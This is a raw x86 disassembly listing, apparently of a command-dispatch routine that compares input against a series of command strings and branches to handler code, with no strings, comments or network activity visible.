1314b2c1:	75 14                	jne    0x1314b2d7
1314b2c3:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b2c9:	68 88 45 17 13       	push   $0x13174588
1314b2ce:	50                   	push   %eax
1314b2cf:	ff 15 98 39 15 13    	call   *0x13153998
1314b2d5:	59                   	pop    %ecx
1314b2d6:	59                   	pop    %ecx
1314b2d7:	80 bb 6c 94 17 13 23 	cmpb   $0x23,0x1317946c(%ebx)
1314b2de:	8d 83 6c 94 17 13    	lea    0x1317946c(%ebx),%eax
1314b2e4:	75 1e                	jne    0x1314b304
1314b2e6:	50                   	push   %eax
1314b2e7:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b2ed:	50                   	push   %eax
1314b2ee:	e8 32 e0 ff ff       	call   0x13149325
1314b2f3:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b2f9:	50                   	push   %eax
1314b2fa:	68 d8 1a 15 13       	push   $0x13151ad8
1314b2ff:	e9 3f 13 00 00       	jmp    0x1314c643
1314b304:	68 a8 1a 15 13       	push   $0x13151aa8
1314b309:	e9 ce 15 00 00       	jmp    0x1314c8dc
1314b30e:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b314:	68 a0 1a 15 13       	push   $0x13151aa0
1314b319:	50                   	push   %eax
1314b31a:	e8 0d 74 ff ff       	call   0x1314272c
1314b31f:	59                   	pop    %ecx
1314b320:	85 c0                	test   %eax,%eax
1314b322:	59                   	pop    %ecx
1314b323:	75 55                	jne    0x1314b37a
1314b325:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b32b:	6a 01                	push   $0x1
1314b32d:	50                   	push   %eax
1314b32e:	57                   	push   %edi
1314b32f:	e8 3e a2 ff ff       	call   0x13145572
1314b334:	83 c4 0c             	add    $0xc,%esp
1314b337:	85 c0                	test   %eax,%eax
1314b339:	75 14                	jne    0x1314b34f
1314b33b:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b341:	68 88 45 17 13       	push   $0x13174588
1314b346:	50                   	push   %eax
1314b347:	ff 15 98 39 15 13    	call   *0x13153998
1314b34d:	59                   	pop    %ecx
1314b34e:	59                   	pop    %ecx
1314b34f:	80 bb 6c 94 17 13 23 	cmpb   $0x23,0x1317946c(%ebx)
1314b356:	75 ac                	jne    0x1314b304
1314b358:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b35e:	68 58 67 17 13       	push   $0x13176758
1314b363:	50                   	push   %eax
1314b364:	e8 49 e0 ff ff       	call   0x131493b2
1314b369:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b36f:	50                   	push   %eax
1314b370:	68 90 1a 15 13       	push   $0x13151a90
1314b375:	e9 c9 12 00 00       	jmp    0x1314c643
1314b37a:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b380:	68 84 1a 15 13       	push   $0x13151a84
1314b385:	50                   	push   %eax
1314b386:	e8 a1 73 ff ff       	call   0x1314272c
1314b38b:	59                   	pop    %ecx
1314b38c:	85 c0                	test   %eax,%eax
1314b38e:	59                   	pop    %ecx
1314b38f:	0f 85 be 00 00 00    	jne    0x1314b453
1314b395:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b39b:	6a 01                	push   $0x1
1314b39d:	50                   	push   %eax
1314b39e:	57                   	push   %edi
1314b39f:	e8 ce a1 ff ff       	call   0x13145572
1314b3a4:	83 c4 0c             	add    $0xc,%esp
1314b3a7:	85 c0                	test   %eax,%eax
1314b3a9:	75 0a                	jne    0x1314b3b5
1314b3ab:	68 60 1a 15 13       	push   $0x13151a60
1314b3b0:	e9 27 15 00 00       	jmp    0x1314c8dc
1314b3b5:	e8 ab 97 ff ff       	call   0x13144b65
1314b3ba:	85 c0                	test   %eax,%eax
1314b3bc:	74 0a                	je     0x1314b3c8
1314b3be:	68 44 1a 15 13       	push   $0x13151a44
1314b3c3:	e9 14 15 00 00       	jmp    0x1314c8dc
1314b3c8:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314b3ce:	68 30 1a 15 13       	push   $0x13151a30
1314b3d3:	50                   	push   %eax
1314b3d4:	ff 15 98 39 15 13    	call   *0x13153998
1314b3da:	59                   	pop    %ecx
1314b3db:	8d b3 64 74 17 13    	lea    0x13177464(%ebx),%esi
1314b3e1:	59                   	pop    %ecx
1314b3e2:	ff 75 08             	pushl  0x8(%ebp)
1314b3e5:	b9 81 01 00 00       	mov    $0x181,%ecx
1314b3ea:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314b3f0:	8b fc                	mov    %esp,%edi
1314b3f2:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314b3f4:	e8 f3 d6 ff ff       	call   0x13148aec
1314b3f9:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314b3ff:	6a 02                	push   $0x2
1314b401:	50                   	push   %eax
1314b402:	ff 75 fc             	pushl  -0x4(%ebp)
1314b405:	e8 68 a1 ff ff       	call   0x13145572
1314b40a:	81 c4 14 06 00 00    	add    $0x614,%esp
1314b410:	85 c0                	test   %eax,%eax
1314b412:	74 1a                	je     0x1314b42e
1314b414:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314b41a:	68 28 1a 15 13       	push   $0x13151a28
1314b41f:	50                   	push   %eax
1314b420:	e8 07 73 ff ff       	call   0x1314272c
1314b425:	f7 d8                	neg    %eax
1314b427:	59                   	pop    %ecx
1314b428:	1b c0                	sbb    %eax,%eax
1314b42a:	59                   	pop    %ecx
1314b42b:	40                   	inc    %eax
1314b42c:	eb 02                	jmp    0x1314b430
1314b42e:	33 c0                	xor    %eax,%eax
1314b430:	33 c9                	xor    %ecx,%ecx
1314b432:	85 c0                	test   %eax,%eax
1314b434:	0f 94 c1             	sete   %cl
1314b437:	51                   	push   %ecx
1314b438:	8d 83 64 75 17 13    	lea    0x13177564(%ebx),%eax
1314b43e:	ff 75 08             	pushl  0x8(%ebp)
1314b441:	50                   	push   %eax
1314b442:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b448:	50                   	push   %eax
1314b449:	e8 64 96 ff ff       	call   0x13144ab2
1314b44e:	e9 eb 0d 00 00       	jmp    0x1314c23e
1314b453:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b459:	68 18 1a 15 13       	push   $0x13151a18
1314b45e:	50                   	push   %eax
1314b45f:	e8 c8 72 ff ff       	call   0x1314272c
1314b464:	59                   	pop    %ecx
1314b465:	85 c0                	test   %eax,%eax
1314b467:	59                   	pop    %ecx
1314b468:	75 2d                	jne    0x1314b497
1314b46a:	e8 f6 96 ff ff       	call   0x13144b65
1314b46f:	85 c0                	test   %eax,%eax
1314b471:	75 0a                	jne    0x1314b47d
1314b473:	68 fc 19 15 13       	push   $0x131519fc
1314b478:	e9 5f 14 00 00       	jmp    0x1314c8dc
1314b47d:	6a 01                	push   $0x1
1314b47f:	e8 c3 96 ff ff       	call   0x13144b47
1314b484:	e8 e2 96 ff ff       	call   0x13144b6b
1314b489:	c1 e8 0a             	shr    $0xa,%eax
1314b48c:	50                   	push   %eax
1314b48d:	68 d0 19 15 13       	push   $0x131519d0
1314b492:	e9 1c ee ff ff       	jmp    0x1314a2b3
1314b497:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b49d:	68 c4 19 15 13       	push   $0x131519c4
1314b4a2:	50                   	push   %eax
1314b4a3:	e8 84 72 ff ff       	call   0x1314272c
1314b4a8:	59                   	pop    %ecx
1314b4a9:	85 c0                	test   %eax,%eax
1314b4ab:	59                   	pop    %ecx
1314b4ac:	75 09                	jne    0x1314b4b7
1314b4ae:	ff 75 08             	pushl  0x8(%ebp)
1314b4b1:	e8 51 e3 ff ff       	call   0x13149807
1314b4b6:	59                   	pop    %ecx
1314b4b7:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b4bd:	68 b8 19 15 13       	push   $0x131519b8
1314b4c2:	50                   	push   %eax
1314b4c3:	e8 64 72 ff ff       	call   0x1314272c
1314b4c8:	59                   	pop    %ecx
1314b4c9:	85 c0                	test   %eax,%eax
1314b4cb:	59                   	pop    %ecx
1314b4cc:	75 14                	jne    0x1314b4e2
1314b4ce:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
1314b4d2:	0f 84 2e 15 00 00    	je     0x1314ca06
1314b4d8:	68 a8 19 15 13       	push   $0x131519a8
1314b4dd:	e9 fa 13 00 00       	jmp    0x1314c8dc
1314b4e2:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b4e8:	68 a0 19 15 13       	push   $0x131519a0
1314b4ed:	50                   	push   %eax
1314b4ee:	e8 39 72 ff ff       	call   0x1314272c
1314b4f3:	59                   	pop    %ecx
1314b4f4:	85 c0                	test   %eax,%eax
1314b4f6:	59                   	pop    %ecx
1314b4f7:	75 7e                	jne    0x1314b577
1314b4f9:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b4ff:	6a 01                	push   $0x1
1314b501:	50                   	push   %eax
1314b502:	57                   	push   %edi
1314b503:	e8 6a a0 ff ff       	call   0x13145572
1314b508:	83 c4 0c             	add    $0xc,%esp
1314b50b:	85 c0                	test   %eax,%eax
1314b50d:	75 21                	jne    0x1314b530
1314b50f:	33 f6                	xor    %esi,%esi
1314b511:	39 35 24 d1 14 13    	cmp    %esi,0x1314d124
1314b517:	74 07                	je     0x1314b520
1314b519:	56                   	push   %esi
1314b51a:	e8 fa d9 ff ff       	call   0x13148f19
1314b51f:	59                   	pop    %ecx
1314b520:	39 35 28 d1 14 13    	cmp    %esi,0x1314d128
1314b526:	0f 84 00 14 00 00    	je     0x1314c92c
1314b52c:	6a 00                	push   $0x0
1314b52e:	eb 2a                	jmp    0x1314b55a
1314b530:	83 3d 24 d1 14 13 00 	cmpl   $0x0,0x1314d124
1314b537:	74 0d                	je     0x1314b546
1314b539:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b53f:	50                   	push   %eax
1314b540:	e8 d4 d9 ff ff       	call   0x13148f19
1314b545:	59                   	pop    %ecx
1314b546:	83 3d 28 d1 14 13 00 	cmpl   $0x0,0x1314d128
1314b54d:	0f 84 d9 13 00 00    	je     0x1314c92c
1314b553:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b559:	50                   	push   %eax
1314b55a:	e8 e4 d5 ff ff       	call   0x13148b43
1314b55f:	83 3d 28 d1 14 13 00 	cmpl   $0x0,0x1314d128
1314b566:	59                   	pop    %ecx
1314b567:	0f 84 bf 13 00 00    	je     0x1314c92c
1314b56d:	68 8c 19 15 13       	push   $0x1315198c
1314b572:	e9 65 13 00 00       	jmp    0x1314c8dc
1314b577:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b57d:	68 88 19 15 13       	push   $0x13151988
1314b582:	50                   	push   %eax
1314b583:	e8 a4 71 ff ff       	call   0x1314272c
1314b588:	59                   	pop    %ecx
1314b589:	85 c0                	test   %eax,%eax
1314b58b:	59                   	pop    %ecx
1314b58c:	75 19                	jne    0x1314b5a7
1314b58e:	68 40 65 17 13       	push   $0x13176540
1314b593:	ff 75 08             	pushl  0x8(%ebp)
1314b596:	e8 99 d6 ff ff       	call   0x13148c34
1314b59b:	59                   	pop    %ecx
1314b59c:	50                   	push   %eax
1314b59d:	68 80 19 15 13       	push   $0x13151980
1314b5a2:	e9 0c ed ff ff       	jmp    0x1314a2b3
1314b5a7:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b5ad:	68 7c 19 15 13       	push   $0x1315197c
1314b5b2:	50                   	push   %eax
1314b5b3:	e8 74 71 ff ff       	call   0x1314272c
1314b5b8:	59                   	pop    %ecx
1314b5b9:	85 c0                	test   %eax,%eax
1314b5bb:	59                   	pop    %ecx
1314b5bc:	75 1c                	jne    0x1314b5da
1314b5be:	e8 56 5c ff ff       	call   0x13141219
1314b5c3:	e8 86 b9 ff ff       	call   0x13146f4e
1314b5c8:	e8 ab d8 ff ff       	call   0x13148e78
1314b5cd:	6a 0a                	push   $0xa
1314b5cf:	e8 33 e2 ff ff       	call   0x13149807
1314b5d4:	59                   	pop    %ecx
1314b5d5:	e9 52 13 00 00       	jmp    0x1314c92c
1314b5da:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b5e0:	68 74 19 15 13       	push   $0x13151974
1314b5e5:	50                   	push   %eax
1314b5e6:	e8 41 71 ff ff       	call   0x1314272c
1314b5eb:	59                   	pop    %ecx
1314b5ec:	85 c0                	test   %eax,%eax
1314b5ee:	59                   	pop    %ecx
1314b5ef:	75 58                	jne    0x1314b649
1314b5f1:	6a 01                	push   $0x1
1314b5f3:	6a 20                	push   $0x20
1314b5f5:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b5fb:	6a 01                	push   $0x1
1314b5fd:	50                   	push   %eax
1314b5fe:	57                   	push   %edi
1314b5ff:	e8 b1 9e ff ff       	call   0x131454b5
1314b604:	83 c4 14             	add    $0x14,%esp
1314b607:	85 c0                	test   %eax,%eax
1314b609:	75 0a                	jne    0x1314b615
1314b60b:	68 5c 19 15 13       	push   $0x1315195c
1314b610:	e9 c7 12 00 00       	jmp    0x1314c8dc
1314b615:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b61b:	6a 00                	push   $0x0
1314b61d:	50                   	push   %eax
1314b61e:	ff 15 8c 33 15 13    	call   *0x1315338c
1314b624:	ff 75 08             	pushl  0x8(%ebp)
1314b627:	e8 b7 d5 ff ff       	call   0x13148be3
1314b62c:	59                   	pop    %ecx
1314b62d:	50                   	push   %eax
1314b62e:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b634:	50                   	push   %eax
1314b635:	ff 75 08             	pushl  0x8(%ebp)
1314b638:	e8 a6 d5 ff ff       	call   0x13148be3
1314b63d:	59                   	pop    %ecx
1314b63e:	50                   	push   %eax
1314b63f:	68 48 19 15 13       	push   $0x13151948
1314b644:	e9 fa 0f 00 00       	jmp    0x1314c643
1314b649:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b64f:	68 40 19 15 13       	push   $0x13151940
1314b654:	50                   	push   %eax
1314b655:	e8 d2 70 ff ff       	call   0x1314272c
1314b65a:	59                   	pop    %ecx
1314b65b:	85 c0                	test   %eax,%eax
1314b65d:	59                   	pop    %ecx
1314b65e:	0f 85 c1 00 00 00    	jne    0x1314b725
1314b664:	e8 48 68 ff ff       	call   0x13141eb1
1314b669:	85 c0                	test   %eax,%eax
1314b66b:	74 0a                	je     0x1314b677
1314b66d:	68 24 19 15 13       	push   $0x13151924
1314b672:	e9 65 12 00 00       	jmp    0x1314c8dc
1314b677:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b67d:	6a 01                	push   $0x1
1314b67f:	50                   	push   %eax
1314b680:	57                   	push   %edi
1314b681:	e8 ec 9e ff ff       	call   0x13145572
1314b686:	83 c4 0c             	add    $0xc,%esp
1314b689:	85 c0                	test   %eax,%eax
1314b68b:	0f 84 8a 00 00 00    	je     0x1314b71b
1314b691:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314b697:	6a 02                	push   $0x2
1314b699:	50                   	push   %eax
1314b69a:	57                   	push   %edi
1314b69b:	e8 d2 9e ff ff       	call   0x13145572
1314b6a0:	83 c4 0c             	add    $0xc,%esp
1314b6a3:	85 c0                	test   %eax,%eax
1314b6a5:	74 74                	je     0x1314b71b
1314b6a7:	8d 85 50 fc ff ff    	lea    -0x3b0(%ebp),%eax
1314b6ad:	6a 03                	push   $0x3
1314b6af:	50                   	push   %eax
1314b6b0:	57                   	push   %edi
1314b6b1:	e8 bc 9e ff ff       	call   0x13145572
1314b6b6:	83 c4 0c             	add    $0xc,%esp
1314b6b9:	85 c0                	test   %eax,%eax
1314b6bb:	75 37                	jne    0x1314b6f4
1314b6bd:	c7 05 c0 66 17 13 3b 	movl   $0x3b,0x131766c0
1314b6c4:	00 00 00 
1314b6c7:	ff 75 08             	pushl  0x8(%ebp)
1314b6ca:	56                   	push   %esi
1314b6cb:	6a 00                	push   $0x0
1314b6cd:	e8 0b d5 ff ff       	call   0x13148bdd
1314b6d2:	50                   	push   %eax
1314b6d3:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b6d9:	ff 35 c0 66 17 13    	pushl  0x131766c0
1314b6df:	50                   	push   %eax
1314b6e0:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314b6e6:	50                   	push   %eax
1314b6e7:	e8 0f 67 ff ff       	call   0x13141dfb
1314b6ec:	83 c4 1c             	add    $0x1c,%esp
1314b6ef:	e9 15 12 00 00       	jmp    0x1314c909
1314b6f4:	8d 85 50 fc ff ff    	lea    -0x3b0(%ebp),%eax
1314b6fa:	50                   	push   %eax
1314b6fb:	e8 08 71 ff ff       	call   0x13142808
1314b700:	85 c0                	test   %eax,%eax
1314b702:	59                   	pop    %ecx
1314b703:	a3 c0 66 17 13       	mov    %eax,0x131766c0
1314b708:	75 bd                	jne    0x1314b6c7
1314b70a:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b710:	50                   	push   %eax
1314b711:	68 0c 19 15 13       	push   $0x1315190c
1314b716:	e9 de 11 00 00       	jmp    0x1314c8f9
1314b71b:	68 e0 18 15 13       	push   $0x131518e0
1314b720:	e9 b7 11 00 00       	jmp    0x1314c8dc
1314b725:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b72b:	68 d4 18 15 13       	push   $0x131518d4
1314b730:	50                   	push   %eax
1314b731:	e8 f6 6f ff ff       	call   0x1314272c
1314b736:	59                   	pop    %ecx
1314b737:	85 c0                	test   %eax,%eax
1314b739:	59                   	pop    %ecx
1314b73a:	75 4c                	jne    0x1314b788
1314b73c:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b742:	6a 01                	push   $0x1
1314b744:	50                   	push   %eax
1314b745:	57                   	push   %edi
1314b746:	e8 27 9e ff ff       	call   0x13145572
1314b74b:	83 c4 0c             	add    $0xc,%esp
1314b74e:	85 c0                	test   %eax,%eax
1314b750:	75 0a                	jne    0x1314b75c
1314b752:	68 b4 18 15 13       	push   $0x131518b4
1314b757:	e9 80 11 00 00       	jmp    0x1314c8dc
1314b75c:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b762:	50                   	push   %eax
1314b763:	e8 0c b8 ff ff       	call   0x13146f74
1314b768:	85 c0                	test   %eax,%eax
1314b76a:	59                   	pop    %ecx
1314b76b:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b771:	50                   	push   %eax
1314b772:	74 0a                	je     0x1314b77e
1314b774:	68 9c 18 15 13       	push   $0x1315189c
1314b779:	e9 7b 11 00 00       	jmp    0x1314c8f9
1314b77e:	68 7c 18 15 13       	push   $0x1315187c
1314b783:	e9 71 11 00 00       	jmp    0x1314c8f9
1314b788:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b78e:	68 70 18 15 13       	push   $0x13151870
1314b793:	50                   	push   %eax
1314b794:	e8 93 6f ff ff       	call   0x1314272c
1314b799:	59                   	pop    %ecx
1314b79a:	85 c0                	test   %eax,%eax
1314b79c:	59                   	pop    %ecx
1314b79d:	75 26                	jne    0x1314b7c5
1314b79f:	e8 0d 67 ff ff       	call   0x13141eb1
1314b7a4:	85 c0                	test   %eax,%eax
1314b7a6:	75 0a                	jne    0x1314b7b2
1314b7a8:	68 58 18 15 13       	push   $0x13151858
1314b7ad:	e9 2a 11 00 00       	jmp    0x1314c8dc
1314b7b2:	6a 01                	push   $0x1
1314b7b4:	e8 d7 66 ff ff       	call   0x13141e90
1314b7b9:	c7 04 24 44 18 15 13 	movl   $0x13151844,(%esp)
1314b7c0:	e9 17 11 00 00       	jmp    0x1314c8dc
1314b7c5:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b7cb:	68 38 18 15 13       	push   $0x13151838
1314b7d0:	50                   	push   %eax
1314b7d1:	e8 56 6f ff ff       	call   0x1314272c
1314b7d6:	59                   	pop    %ecx
1314b7d7:	85 c0                	test   %eax,%eax
1314b7d9:	59                   	pop    %ecx
1314b7da:	0f 85 35 01 00 00    	jne    0x1314b915
1314b7e0:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
1314b7e4:	75 33                	jne    0x1314b819
1314b7e6:	68 a8 19 15 13       	push   $0x131519a8
1314b7eb:	68 68 7c 17 13       	push   $0x13177c68
1314b7f0:	ff 15 98 39 15 13    	call   *0x13153998
1314b7f6:	59                   	pop    %ecx
1314b7f7:	be 68 7a 17 13       	mov    $0x13177a68,%esi
1314b7fc:	59                   	pop    %ecx
1314b7fd:	6a 01                	push   $0x1
1314b7ff:	b9 81 01 00 00       	mov    $0x181,%ecx
1314b804:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314b80a:	8b fc                	mov    %esp,%edi
1314b80c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314b80e:	e8 d9 d2 ff ff       	call   0x13148aec
1314b813:	81 c4 08 06 00 00    	add    $0x608,%esp
1314b819:	83 3d 90 a5 17 13 00 	cmpl   $0x0,0x1317a590
1314b820:	74 37                	je     0x1314b859
1314b822:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314b828:	68 58 68 17 13       	push   $0x13176858
1314b82d:	50                   	push   %eax
1314b82e:	ff 15 98 39 15 13    	call   *0x13153998
1314b834:	59                   	pop    %ecx
1314b835:	8d b3 64 74 17 13    	lea    0x13177464(%ebx),%esi
1314b83b:	59                   	pop    %ecx
1314b83c:	ff 75 08             	pushl  0x8(%ebp)
1314b83f:	b9 81 01 00 00       	mov    $0x181,%ecx
1314b844:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314b84a:	8b fc                	mov    %esp,%edi
1314b84c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314b84e:	e8 99 d2 ff ff       	call   0x13148aec
1314b853:	81 c4 08 06 00 00    	add    $0x608,%esp
1314b859:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b85f:	6a 01                	push   $0x1
1314b861:	50                   	push   %eax
1314b862:	ff 75 fc             	pushl  -0x4(%ebp)
1314b865:	e8 08 9d ff ff       	call   0x13145572
1314b86a:	83 c4 0c             	add    $0xc,%esp
1314b86d:	85 c0                	test   %eax,%eax
1314b86f:	75 0a                	jne    0x1314b87b
1314b871:	68 18 18 15 13       	push   $0x13151818
1314b876:	e9 61 10 00 00       	jmp    0x1314c8dc
1314b87b:	e8 96 6d ff ff       	call   0x13142616
1314b880:	85 c0                	test   %eax,%eax
1314b882:	74 10                	je     0x1314b894
1314b884:	e8 93 6d ff ff       	call   0x1314261c
1314b889:	50                   	push   %eax
1314b88a:	68 f4 17 15 13       	push   $0x131517f4
1314b88f:	e9 65 10 00 00       	jmp    0x1314c8f9
1314b894:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314b89a:	6a 02                	push   $0x2
1314b89c:	50                   	push   %eax
1314b89d:	ff 75 fc             	pushl  -0x4(%ebp)
1314b8a0:	e8 cd 9c ff ff       	call   0x13145572
1314b8a5:	83 c4 0c             	add    $0xc,%esp
1314b8a8:	85 c0                	test   %eax,%eax
1314b8aa:	74 0f                	je     0x1314b8bb
1314b8ac:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314b8b2:	50                   	push   %eax
1314b8b3:	e8 50 6f ff ff       	call   0x13142808
1314b8b8:	59                   	pop    %ecx
1314b8b9:	eb 05                	jmp    0x1314b8c0
1314b8bb:	a1 2c d3 14 13       	mov    0x1314d32c,%eax
1314b8c0:	85 c0                	test   %eax,%eax
1314b8c2:	a3 3c 65 17 13       	mov    %eax,0x1317653c
1314b8c7:	75 11                	jne    0x1314b8da
1314b8c9:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b8cf:	50                   	push   %eax
1314b8d0:	68 d8 17 15 13       	push   $0x131517d8
1314b8d5:	e9 1f 10 00 00       	jmp    0x1314c8f9
1314b8da:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314b8e0:	68 9c a5 17 13       	push   $0x1317a59c
1314b8e5:	50                   	push   %eax
1314b8e6:	ff 15 98 39 15 13    	call   *0x13153998
1314b8ec:	59                   	pop    %ecx
1314b8ed:	8d 83 64 75 17 13    	lea    0x13177564(%ebx),%eax
1314b8f3:	59                   	pop    %ecx
1314b8f4:	ff 75 08             	pushl  0x8(%ebp)
1314b8f7:	50                   	push   %eax
1314b8f8:	e8 e0 d2 ff ff       	call   0x13148bdd
1314b8fd:	50                   	push   %eax
1314b8fe:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b904:	ff 35 3c 65 17 13    	pushl  0x1317653c
1314b90a:	50                   	push   %eax
1314b90b:	e8 2f 6c ff ff       	call   0x1314253f
1314b910:	e9 3b 0d 00 00       	jmp    0x1314c650
1314b915:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b91b:	68 c8 17 15 13       	push   $0x131517c8
1314b920:	50                   	push   %eax
1314b921:	e8 06 6e ff ff       	call   0x1314272c
1314b926:	59                   	pop    %ecx
1314b927:	85 c0                	test   %eax,%eax
1314b929:	59                   	pop    %ecx
1314b92a:	75 26                	jne    0x1314b952
1314b92c:	e8 e5 6c ff ff       	call   0x13142616
1314b931:	85 c0                	test   %eax,%eax
1314b933:	75 0a                	jne    0x1314b93f
1314b935:	68 ac 17 15 13       	push   $0x131517ac
1314b93a:	e9 9d 0f 00 00       	jmp    0x1314c8dc
1314b93f:	6a 01                	push   $0x1
1314b941:	e8 82 6c ff ff       	call   0x131425c8
1314b946:	c7 04 24 94 17 15 13 	movl   $0x13151794,(%esp)
1314b94d:	e9 8a 0f 00 00       	jmp    0x1314c8dc
1314b952:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b958:	68 88 17 15 13       	push   $0x13151788
1314b95d:	50                   	push   %eax
1314b95e:	e8 c9 6d ff ff       	call   0x1314272c
1314b963:	59                   	pop    %ecx
1314b964:	85 c0                	test   %eax,%eax
1314b966:	59                   	pop    %ecx
1314b967:	75 52                	jne    0x1314b9bb
1314b969:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b96f:	6a 01                	push   $0x1
1314b971:	50                   	push   %eax
1314b972:	57                   	push   %edi
1314b973:	e8 fa 9b ff ff       	call   0x13145572
1314b978:	83 c4 0c             	add    $0xc,%esp
1314b97b:	83 3d 90 a5 17 13 00 	cmpl   $0x0,0x1317a590
1314b982:	74 07                	je     0x1314b98b
1314b984:	b8 58 68 17 13       	mov    $0x13176858,%eax
1314b989:	eb 11                	jmp    0x1314b99c
1314b98b:	ff 75 08             	pushl  0x8(%ebp)
1314b98e:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b994:	50                   	push   %eax
1314b995:	e8 08 9d ff ff       	call   0x131456a2
1314b99a:	59                   	pop    %ecx
1314b99b:	59                   	pop    %ecx
1314b99c:	50                   	push   %eax
1314b99d:	ff 75 08             	pushl  0x8(%ebp)
1314b9a0:	e8 59 d2 ff ff       	call   0x13148bfe
1314b9a5:	59                   	pop    %ecx
1314b9a6:	50                   	push   %eax
1314b9a7:	ff 75 08             	pushl  0x8(%ebp)
1314b9aa:	e8 6a d2 ff ff       	call   0x13148c19
1314b9af:	59                   	pop    %ecx
1314b9b0:	50                   	push   %eax
1314b9b1:	68 70 17 15 13       	push   $0x13151770
1314b9b6:	e9 88 0c 00 00       	jmp    0x1314c643
1314b9bb:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b9c1:	68 68 17 15 13       	push   $0x13151768
1314b9c6:	50                   	push   %eax
1314b9c7:	e8 60 6d ff ff       	call   0x1314272c
1314b9cc:	59                   	pop    %ecx
1314b9cd:	85 c0                	test   %eax,%eax
1314b9cf:	59                   	pop    %ecx
1314b9d0:	75 63                	jne    0x1314ba35
1314b9d2:	e8 2f c4 ff ff       	call   0x13147e06
1314b9d7:	85 c0                	test   %eax,%eax
1314b9d9:	74 0a                	je     0x1314b9e5
1314b9db:	68 50 17 15 13       	push   $0x13151750
1314b9e0:	e9 f7 0e 00 00       	jmp    0x1314c8dc
1314b9e5:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b9eb:	6a 01                	push   $0x1
1314b9ed:	50                   	push   %eax
1314b9ee:	57                   	push   %edi
1314b9ef:	e8 7e 9b ff ff       	call   0x13145572
1314b9f4:	83 c4 0c             	add    $0xc,%esp
1314b9f7:	85 c0                	test   %eax,%eax
1314b9f9:	74 0f                	je     0x1314ba0a
1314b9fb:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314ba01:	50                   	push   %eax
1314ba02:	e8 01 6e ff ff       	call   0x13142808
1314ba07:	59                   	pop    %ecx
1314ba08:	eb 05                	jmp    0x1314ba0f
1314ba0a:	a1 34 d3 14 13       	mov    0x1314d334,%eax
1314ba0f:	85 c0                	test   %eax,%eax
1314ba11:	a3 88 68 17 13       	mov    %eax,0x13176888
1314ba16:	75 11                	jne    0x1314ba29
1314ba18:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314ba1e:	50                   	push   %eax
1314ba1f:	68 38 17 15 13       	push   $0x13151738
1314ba24:	e9 d0 0e 00 00       	jmp    0x1314c8f9
1314ba29:	ff 75 08             	pushl  0x8(%ebp)
